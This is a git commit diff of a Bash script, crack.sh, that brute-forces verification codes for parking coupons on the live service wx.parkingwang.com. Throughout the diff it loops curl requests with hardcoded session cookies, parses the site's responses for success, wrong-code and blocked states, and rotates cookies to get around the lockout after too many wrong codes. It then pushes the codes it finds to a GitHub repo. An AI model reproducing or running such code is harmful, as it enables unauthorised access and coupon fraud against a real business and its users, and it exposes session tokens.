58bb99f7c1261e87e85828de403602cc3f2c736d
doubhor <doubhor@qq.com>
2019-10-23 17:08:03 +0800

    add line by cmd

--- crack.sh
+++ crack.sh
@@ -14,6 +14,105 @@ ck=$1;shift; n1=$1;shift; n2=$1;shift;
 #
 #如果速度很慢，重新登录换一个Cookie
 
+# const param
+id_k="BkPTdVZaOYaoML6UwMGJyg=="
+id_h="ZT5pUv4JKL1tomT0u9SEdA=="
+
+query_park()
+{
+    p_c=$1;shift;
+    p_code=$1;shift;
+    p_id=$1;shift;
+
+    curl -L "http://wx.parkingwang.com/coupon/coupon_show?coupon=${p_id}&verification=${p_code}" \
+    -H "Cookie: parking_ses=${p_c}" \
+    -H 'Connection: keep-alive' \
+    -H 'Upgrade-Insecure-Requests: 1' \
+    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36' \
+    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
+    -H 'Referer: http://wx.parkingwang.com/coupon/input_code?coupon_id=BkPTdVZaOYaoML6UwMGJyg==' \
+    -H 'Accept-Encoding: gzip, deflate' \
+    -H 'Accept-Language: zh-CN,zh;q=0.9' \
+    -H 'misctooltoken: c6d1ad2b9afs4fbab56aaa3e0267deb9' --compressed 2>&1 | egrep "(alert)|(span)" | paste -s -d ":" -
+}
+
+parse_res()
+{
+    p_res=$1;shift;
+    if echo "${p_res}" | grep -q "请输入车牌"
+    then
+        echo "res:success"
+    elif echo "${p_res}" | grep -q "输入您的手机号码"
+    then
+        echo "res:fail:ck:login"
+    elif echo "${p_res}" | grep -q "输入错误验证码次数过多"
+    then
+        echo "res:fail:ck:block"
+    elif echo "${p_res}" | grep -q "请求参数错误"
+    then
+        echo "res:fail:id:param"
+    elif echo "${p_res}" | grep -q "优惠券不存在"
+    then
+        p_n=`echo "${p_res}" | egrep  "(优惠券不存在)" | grep -o "[0-9]次" | grep -o "[0-9]"`
+        [ "${p_n}x" == "x" ] && p_n="x"
+        echo "res:fail:code:${p_n}"
+    elif echo "${p_res}" | grep -q "没有优惠券了"
+    then
+        p_n=`echo "${p_res}" | egrep  "(没有优惠券了)" | grep -o "[0-9]次" | grep -o "[0-9]"`
+        echo "res:fail:code:${p_n}"
+    else
+        echo ${p_res}
+    fi
+}
+
+check_park()
+{
+    p_c=$1;shift;
+    p_code=$1;shift;
+    p_id=$1;shift;
+
+    # BkPTdVZaOYaoML6UwMGJyg==
+    # ZT5pUv4JKL1tomT0u9SEdA==
+    [ "${p_code}x" == "x" ] && p_code="242"
+    [ "${p_id}x" == "x" ] && p_id="BkPTdVZaOYaoML6UwMGJyg=="
+    #echo "ck=#${p_c}# code=#${p_code}# id=#${p_id}#"
+
+    p_html=`query_park ${p_c} ${p_code} ${p_id}`
+    parse_res "${p_html}"
+}
+
+do_try()
+{
+    p_ck=$1;shift;
+    p_code=$1;shift;
+    p_s=`check_park ${p_ck} ${p_code} ${id_h}`
+    if echo "${p_s}" | grep -q "res:success"
+    then
+        echo -n -e " [\\033[32m\\033[1m${p_code}\\033[0m]"
+        res_code="${res_code}${p_code} "
+    else
+        ns=`echo "${p_s}" | grep "res:fail:code" | cut -d ":" -f 4`
+        [ "${ns}z" == "z" ] && ns="Q"
+        [ "${ns}z" == "xz" ] && echo -n -e " \\033[31m\\033[1m$(printf "%3d" ${p_code})\\033[0m|${ns}" || echo -n " $(printf "%3d" ${p_code})|${ns}"
+   fi
+}
+
+sendgit()
+{
+    p_file=$1;shift;
+    p_linen=$1;shift;
+    p_msg=$*
+
+    p_dir=~/work/code/github/board
+    p_tmpfile="tmp_${p_file}.tmp"
+    p_gittime=`date +"%Y-%m-%d %H:%M:%S"`
+
+    echo "${p_gittime} ${p_msg}" | cat - ${p_dir}/${p_file} | head -n ${p_linen} > ${p_tmpfile}
+    cat ${p_tmpfile} > ${p_dir}/${p_file}
+    cd ${p_dir} && git commit -a -m "add line by cmd"
+    cd ${p_dir} && git push
+}
+
 # test cookie
 best_ck="6424b6c327b5eb5961733b3de77834f38b21104f"
 besk_ckt=999
@@ -25,7 +124,7 @@ for ick in \
     364beeb9d67580f6ab8f1906e36f576a7ff3925d
 do
     cks1=`date +%s`
-    ./ok.sh ${ick} | grep -q "请输入车牌" && ck_flag="Y" || ck_flag="n"
+    check_park ${ick} | grep -q "res:success" && ck_flag="Y" || ck_flag="n"
     cks2=`date +%s`
     ck_t=$((cks2-cks1))
     echo -n "[$(printf "%3d" ${ck_t})] ${ck_flag} ${ick}"
@@ -40,8 +139,6 @@ echo "ckN:${ck_OK_n} T:${besk_ckt} ${best_ck}"
 echo -n -e "\\033[32m\\033[1m$ BEGIN \\033[0m "; date +"%Y-%m-%d %H:%M:%S"; echo " begin=${n1} end=${n2} ck=${ck}"
 
 #ok_info
-id_k="BkPTdVZaOYaoML6UwMGJyg=="
-id_h="ZT5pUv4JKL1tomT0u9SEdA=="
 code_k="242"
 code_h="116"
 ok_id="${id_k}"
@@ -57,8 +154,8 @@ checkRes=""
 touch ${resfile}
 for i in `cat ${resfile}`
 do
-    s=`./try.sh ${ck} ${i}`
-    if echo "${s}" | grep -q "ok" 
+    s=`check_park ${ck} ${i} ${id_h}`
+    if echo "${s}" | grep -q "res:success" 
     then
         okN=$((okN+1))
         res_code="${res_code}${i} "
@@ -77,14 +174,12 @@ then
         checkPassFlag="yes"
         [ ${failN} -gt 0 ] && needSaveGitCode="yes"
     fi
-    logTxt="N=${okN}:${failN} checkPass=${checkPassFlag} syncGit=${needSaveGitCode} checkRes=${checkRes}"
 fi
-logTxt="ckN=${ck_OK_n} T=${besk_ckt} ck=${ck} codeN=${okN}:${failN} checkPass=${checkPassFlag} syncGit=${needSaveGitCode} checkRes=${checkRes}"
+logTxt="ckN=${ck_OK_n} T=${besk_ckt} codeN=${okN}:${failN} checkPass=${checkPassFlag} syncGit=${needSaveGitCode} checkRes=${checkRes} ck=${ck}"
 echo ${logTxt}
 
 # send by github
-gittime=`date +"%Y-%m-%d %H:%M:%S"`
-./sendgit.sh crontab.log 50 ${gittime} ${logTxt}
+sendgit crontab.log 50 ${logTxt}
 
 
 if [ "${checkPassFlag}x" == "yesx" ]
@@ -93,26 +188,11 @@ then
     if [ "${needSaveGitCode}x" == "yesx" ]
     then
         echo "${res_code}" > ${resfile}
-        gittime=`date +"%Y-%m-%d %H:%M:%S"`
-        ./sendgit.sh vcode.txt 7 ${gittime} ${res_code}
+        sendgit vcode.txt 7 ${res_code}
     fi
     exit 0
 fi
 
-do_try()
-{
-    p_ck=$1;shift;
-    p_code=$1;shift;
-    s=`./try.sh ${p_ck} ${p_code}`
-    ns=`echo "${s}" | cut -d "=" -f 2`
-    if echo "${s}" | grep -q "ok"
-    then
-        echo -n -e " [\\033[32m\\033[1m${j}\\033[0m]"
-        res_code="${res_code}${p_code} "
-    else
-        [ "${ns}z" == "xz" ] && echo -n -e " \\033[31m\\033[1m$(printf "%3d" ${j})\\033[0m|${ns}" || echo -n " $(printf "%3d" ${j})|${ns}"
-   fi
-}
 
 
 d1=`date +"%Y-%m-%d %H:%M:%S"`
@@ -127,13 +207,10 @@ do
     rstSucFlag="false"
     for idxRst in `seq 1 9`
     do
-        ./ok.sh ${ck} | grep -q "请输入车牌" && echo -n " Y${idxRst}" && rstSucFlag="success" && break
+        check_park ${ck} | grep -q "res:success" && echo -n " Y${idxRst}" && rstSucFlag="success" && break
     done
     [ "${rstSucFlag}x" != "successx" ] && { echo " Fail"; exit 1; }
     
-    #s=`./try.sh ${ck} ${j}`; echo "${j} ${s}" | grep "[0-9][0-9].*alert"; n=$((n+1)); j=$((j+1));
-    #s=`./try.sh ${ck} ${j}`; ns=`echo "${s}" | grep -o "[0-9]次" | grep -o "[0-9]"`; echo "${s}" | grep -q "请输入车牌" && echo -n -e " [\\033[32m\\033[1m${j}\\033[0m]" || echo -n " $(printf "%3d" ${j})|${ns}"; n=$((n+1)); lc=$((lc+1)); j=$((j+1));
-    #s=`./try.sh ${ck} ${j}`; ns=`echo "${s}" | cut -d "=" -f 2`; echo "${s}" | grep -q "ok" && echo -n -e " [\\033[32m\\033[1m${j}\\033[0m]" || echo -n " $(printf "%3d" ${j})|${ns}"; n=$((n+1)); lc=$((lc+1)); j=$((j+1));
     do_try ${ck} ${j}; n=$((n+1)); lc=$((lc+1)); j=$((j+1));
     do_try ${ck} ${j}; n=$((n+1)); lc=$((lc+1)); j=$((j+1));
     do_try ${ck} ${j}; n=$((n+1)); lc=$((lc+1)); j=$((j+1));
@@ -152,6 +229,5 @@ echo "${res_code}" > ${resfile}
 
 
 # send by github
-gittime=`date +"%Y-%m-%d %H:%M:%S"`
-./sendgit.sh vcode.txt 7 ${gittime} ${res_code}
+sendgit vcode.txt 7 ${res_code}
 
